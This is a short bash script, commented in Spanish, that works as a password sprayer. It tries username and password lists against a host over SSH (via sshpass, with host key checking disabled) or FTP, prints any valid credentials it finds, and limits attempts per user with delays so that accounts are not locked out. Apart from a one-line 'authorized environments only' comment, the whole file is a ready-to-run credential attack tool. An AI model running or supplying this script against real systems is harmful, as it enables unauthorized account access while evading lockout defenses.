#!/usr/bin/env bash
# Password Sprayer (B) – Rotación de contraseñas, límite por usuario
# Uso: ./sprayer_b.sh users.txt passwords.txt 10.0.0.5 ssh
# Reqs: sshpass / ftp
# ⚠️ Solo en entornos autorizados.

set -euo pipefail
USERS="${1:-}"; PWDS="${2:-}"; HOST="${3:-}"; SVC="${4:-ssh}"
DELAY="${DELAY:-3}" MAX_PER_USER="${MAX_PER_USER:-2}"

[[ -z "$USERS" || -z "$PWDS" || -z "$HOST" ]] && { echo "Uso: $0 <users.txt> <passwords.txt> <host> [ssh|ftp]"; exit 1; }

attempt_ssh(){ sshpass -p "$2" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$1@$HOST" "exit" &>/dev/null; }
attempt_ftp(){ timeout 5 bash -lc "printf 'user $1 $2\nquit\n' | ftp -inv $HOST" | grep -qi "logged in"; }

while IFS= read -r u; do
  [[ -z "$u" ]] && continue
  echo "[*] Usuario $u – probando hasta $MAX_PER_USER contraseñas…"
  c=0
  while IFS= read -r p; do
    [[ -z "$p" ]] && continue
    ((c++))
    echo "  - Intento $c con '$p'"
    if [[ "$SVC" == "ssh" ]]; then if attempt_ssh "$u" "$p"; then echo "[+] Válido SSH: $u:$p"; break; fi
    else                      if attempt_ftp "$u" "$p"; then echo "[+] Válido FTP: $u:$p"; break; fi
    fi
    sleep "$DELAY"
    [[ $c -ge $MAX_PER_USER ]] && { echo "  ~ Límite alcanzado para $u (evitar lockout)"; break; }
  done < "$PWDS"
done < "$USERS"
